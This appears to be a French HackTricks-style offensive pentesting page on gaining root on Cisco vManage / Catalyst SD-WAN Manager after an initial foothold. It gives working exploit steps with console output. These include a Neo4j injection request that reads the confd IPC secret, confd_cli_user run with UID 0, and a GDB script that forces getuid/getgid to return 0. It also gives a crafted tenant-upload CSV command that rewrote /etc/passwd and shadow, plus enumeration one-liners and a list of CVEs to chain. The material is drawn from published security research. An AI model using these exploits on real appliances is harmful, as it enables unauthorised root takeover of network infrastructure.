# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Une fois que vous avez une exécution de code sur Cisco vManage / *Catalyst SD-WAN Manager* en tant que `vmanage`, `netadmin`, ou `vmanage-admin`, les surfaces de privesc locales les plus intéressantes sont généralement la pile CLI `confd`, l'utilitaire `cmdptywrapper`, les API REST localhost, et les gestionnaires d'import/upload appartenant à root.

Si vous avez encore besoin de **l'accès initial** sur un contrôleur, consultez d'abord la page dédiée au control-plane :

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Si `/etc/confd/confd_ipc_secret` est lisible depuis votre foothold, Path 1 et Path 2 deviennent immédiatement pratiques. Si vous êtes arrivé via un remote info leak ou un webshell, vérifiez aussi si vous pouvez déjà atteindre le matériel SSH `vmanage-admin` ou les upload handlers de multitenancy : des recherches de 2026 ont montré que les deux étaient des étapes intermédiaires réalistes.

## Path 1

(Exemple tiré de [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Après avoir creusé un peu dans une [documentation](http://66.218.245.39/doc/html/rn03re18.html) liée à `confd` et aux différents binaires (accessible avec un compte sur le site web de Cisco), nous avons trouvé que pour authentifier le socket IPC, il utilise un secret situé dans `/etc/confd/confd_ipc_secret` :
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Tu te souviens de notre instance Neo4j ? Elle s’exécute sous les privilèges de l’utilisateur `vmanage`, ce qui nous permet de récupérer le fichier en utilisant la vulnérabilité précédente :
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Le programme `confd_cli` ne prend pas en charge les arguments en ligne de commande, mais appelle `/usr/bin/confd_cli_user` avec des arguments. Nous pourrions donc appeler directement `/usr/bin/confd_cli_user` avec notre propre ensemble d'arguments. Cependant, il n'est pas lisible avec nos privilèges actuels, donc nous devons le récupérer depuis le rootfs et le copier avec scp, lire l'aide, et l'utiliser pour obtenir le shell :
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

(Exemple tiré de [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Le blog¹ de l’équipe synacktiv décrivait une façon élégante d’obtenir un root shell, mais le bémol est qu’elle nécessite d’obtenir une copie de `/usr/bin/confd_cli_user`, qui n’est lisible que par root. J’ai trouvé une autre façon d’escalader vers root sans une telle contrainte.

Lorsque j’ai désassemblé le binaire `/usr/bin/confd_cli`, j’ai observé ce qui suit :

<details>
<summary>Objdump montrant la collecte du UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Quand j’exécute “ps aux”, j’ai observé ce qui suit (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
J’ai émis l’hypothèse que le programme “confd_cli” transmet l’ID utilisateur et l’ID de groupe qu’il a récupérés depuis l’utilisateur connecté à l’application “cmdptywrapper”.

Ma première tentative a consisté à exécuter “cmdptywrapper” directement en lui fournissant `-g 0 -u 0`, mais cela a échoué. Il semble qu’un descripteur de fichier (-i 1015) ait été créé quelque part en cours de route et je ne peux pas le falsifier.

Comme mentionné dans le blog de synacktiv(dernier exemple), le programme “confd_cli” ne prend pas en charge les arguments en ligne de commande, mais je peux l’influencer avec un debugger et, heureusement, GDB est inclus sur le système.

J’ai créé un script GDB dans lequel j’ai forcé les API `getuid` et `getgid` à retourner 0. Comme j’ai déjà le privilège “vmanage” via le RCE de désérialisation, j’ai l’autorisation de lire directement `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
<details>
<summary>Sortie de la console</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco a ensuite documenté un chemin local vers root plus propre dans son propre avis pour [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) : un **attaquant authentifié avec seulement des privilèges en lecture seule** pouvait envoyer une requête forgée au manager CLI et obtenir root à cause d’une validation d’entrée insuffisante.

D’un point de vue offensif, voici l’essentiel à retenir :

1. Une fois que vous avez *n’importe quel* point d’appui low-priv sur la machine, vous devriez tester le service CLI local avant de passer au workflow plus lourd de Path 1 / Path 2.
2. Réutilisez les artefacts de Path 2 pour trouver la frontière de confiance : `confd_cli` → `cmdptywrapper` → `vshell`.
3. Considérez chaque champ transmis au backend CLI comme suspect : UID/GID, username, terminal metadata, imported files, ou toute valeur consommée plus tard par un helper appartenant à root.
4. Si un utilisateur low-priv peut atteindre le socket CLI local et influencer ces champs, root peut n’être qu’à une requête forgée de distance.

Un workflow pratique après être arrivé sur l’appliance est :
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Cela transforme le bug de 2025 en un bon schéma de hunting pour des versions similaires : cherchez des **local CLI shims qui collectent l’identité dans userland et la transmettent à un wrapper plus privilégié**.

Ne confondez pas **CVE-2025-20122** avec la plus tardive **CVE-2026-20122** : le problème de 2025 est un bug *local* CLI-to-root, tandis que le problème de 2026 est un *remote* API arbitrary file overwrite qui sert surtout à placer un foothold, puis à revisiter Path 1 / Path 2 / Path 4.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

L’advisory de Cisco de février 2026 a aussi introduit une autre classe de privesc utile : [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) permettait à un **authenticated, local attacker with low privileges** d’obtenir root à cause d’un mécanisme de user-authentication insuffisant dans la REST API.

Cela compte parce que la privesc vManage ne se limite plus à l’abus de `confd`/TTY. Après un shell low-priv, cherchez aussi :

- des endpoints API uniquement accessibles depuis localhost qui font trop confiance à l’appelant
- des tokens, cookies ou service credentials lisibles depuis le compte courant
- des actions root-only exposées via des handlers `dataservice`/REST qui peuvent encore être déclenchées localement

En pratique, une fois que vous avez un shell en tant que `vmanage` ou un autre service user, l’abus local de l’API est souvent plus discret et plus facile à automatiser que l’abus interactif de la CLI :
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Si le contexte de session local suffit pour atteindre des fonctionnalités REST privilégiées, privilégiez le chemin API : il est plus facile à rejouer, à automatiser, et à chaîner avec des sessions web volées ou des API tokens.

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

Un autre schéma récent est [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx) : un attaquant local avec des privilèges `netadmin` pouvait téléverser un **crafted file** que le CLI traitait ensuite de manière non sécurisée, ce qui menait à une command injection en tant que `root`.

Du point de vue de HackTricks, la technique utile est plus large que le CVE spécifique :

1. Énumérez chaque workflow CLI ou web qui accepte un fichier : imports, diagnostic bundles, templates, validators, backups, tenant data, etc.
2. Tracez où le fichier téléversé arrive et quel script ou binaire appartenant à `root` le consomme.
3. Testez si le nom de fichier, le contenu du fichier ou les métadonnées analysées sont jamais transmis à des commandes shell, des scripts wrapper, ou des helpers de type `system()`.
4. Si vous pouvez déjà atteindre `netadmin` (valid creds, stolen session, ou une chaîne d'auth-bypass), les bugs de file-processing sont souvent le chemin le plus rapide vers `root`.

Google Cloud / Mandiant ont ensuite montré une instance très concrète de cette classe de bug exploitée via le chemin d'import multitenancy :
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
Dans l'attaque observée, le CSV conçu a fini par modifier `/etc/passwd` et `/etc/shadow` pour créer un compte temporaire UID 0 (`troot`). Cela rend les importeurs de type `tenant-upload` / `tenant-list` particulièrement intéressants : ce ne sont pas seulement des fonctionnalités d'ingestion de données, mais aussi des front-ends de parser potentiellement détenus par root.

Un pattern rapide de hunting côté shell est :
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Cette classe de bug se chaîne particulièrement bien avec des footholds distants qui accordent `netadmin` mais pas `root`.

## Autres vulnérabilités récentes de vManage/Catalyst SD-WAN Manager à enchaîner

- **Fuite d’info non authentifiée (CVE-2026-20133)** – Particulièrement intéressante car des recherches publiques ont montré qu’elle pouvait exposer `confd_ipc_secret` ou la clé privée `vmanage-admin`, transformant un bug de lecture en Path 1 ou en pivot NETCONF.
- **Écrasement arbitraire de fichier via API authentifiée (CVE-2026-20122)** – Différent du bug CLI 2025 ci-dessus ; VulnCheck l’a utilisé pour téléverser un webshell, ce qui rend ensuite les chemins de privesc locaux sur cette page immédiatement pertinents.
- **XSS UI authentifié (CVE-2024-20475)** – Voler une session admin dans le web UI, puis pivoter vers des actions API/CLI qui mènent finalement à `vshell` ou à l’un des chemins de privesc locaux ci-dessus.
- **Auth bypass distant vers `netadmin` (CVE-2026-20129)** – Très bon précurseur pour Path 5 car `netadmin` est exactement le niveau requis par la privesc 2026 via fichier forgé.
- **Écriture arbitraire de fichier authentifiée (CVE-2026-20262)** – Valeur offensive similaire à CVE-2026-20122 mais via un chemin de téléversement web UI plus tardif : écrire dans un emplacement qui sera ensuite parsé par root ou par la couche web du management plane.
- **Downgrade pour ressusciter l’ancienne privesc CLI (CVE-2022-20775)** – Les intrusions de 2026 ont montré que les attaquants peuvent revenir à un ancien build SD-WAN vulnérable, exploiter l’ancien bug root CLI, puis restaurer la version d’origine.
- **Auth bypass pre-auth du control-plane (CVE-2026-20182)** – Mieux documenté dans la page dédiée au control-plane SD-WAN ; il peut ajouter une clé SSH pour `vmanage-admin`, vous donnant le foothold local nécessaire pour revisiter cette page.



## Références

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
